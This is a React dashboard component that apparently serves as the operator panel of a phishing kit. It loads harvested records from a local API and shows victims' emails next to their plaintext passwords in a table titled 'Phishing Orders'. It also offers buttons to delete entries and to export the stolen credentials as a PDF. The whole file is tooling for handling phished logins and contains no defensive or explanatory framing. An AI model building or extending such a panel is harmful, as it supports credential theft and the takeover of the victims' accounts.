import React from "react";
import jsPDF from "jspdf";
import axios from "axios";

const Dashbord = () => {
  const [users, setUsers] = React.useState(null);
  let rndId = 1;
  React.useEffect(() => {
    const fetch = async () => {
      const { data } = await axios.get("http://localhost:8080/api/get");
      setUsers(data);
    };
    fetch();
  }, []);
  const removeOrders = async (name) => {
    await axios.delete(`http://localhost:8080/api/delete/${name}`);
  };
  const dowloandPdf = () => {
    let pdf = new jsPDF("p", "pt", "a4");
    pdf.html(document.getElementById("box_info"), {
      callback: function (pd) {
        pd.save("asrbekPdf.pdf");
      },
    });
  };

  return (
    <main>
      <div className="head-title">
        <div className="left">
          <h1>Dashboard</h1>
          <ul className="breadcrumb">
            <li>
              <a href="https://iqlim.uz">Dashboard</a>
            </li>
            <li>
              <i className="bx bx-chevron-right"></i>
            </li>
            <li>
              <a className="active" href="https://iqlim.uz">
                Home
              </a>
            </li>
          </ul>
        </div>
        <a href="#f" className="btn-download" onClick={dowloandPdf}>
          <i className="bx bxs-cloud-download"></i>
          <span className="text">Download PDF</span>
        </a>
      </div>

      <ul className="box-info">
        <li>
          <i className="bx bxs-calendar-check"></i>
          <span className="text">
            <h3>{users?.length}</h3>
            <p>New Users</p>
          </span>
        </li>
      </ul>

      <div className="table-data" id="box_info">
        <div className="order">
          <div className="head">
            <h3>Phishing Orders</h3>
            <i className="bx bx-search"></i>
            <i className="bx bx-filter"></i>
          </div>
          <table>
            <thead>
              <tr>
                <th>User</th>
                <th>Password</th>
                <th>Remove</th>
              </tr>
            </thead>
            <tbody>
              {users?.map((items) => (
                <tr key={items.id}>
                  <td>
                    <b>{rndId++}</b>
                    <span>{items.email[0]}</span>
                    <p>{items.email}</p>
                  </td>
                  <td>{items.password}</td>
                  <td>
                    <button
                      className="status pending btn"
                      onClick={() => removeOrders(items.email)}
                    >
                      Remove
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </main>
  );
};

export default Dashbord;
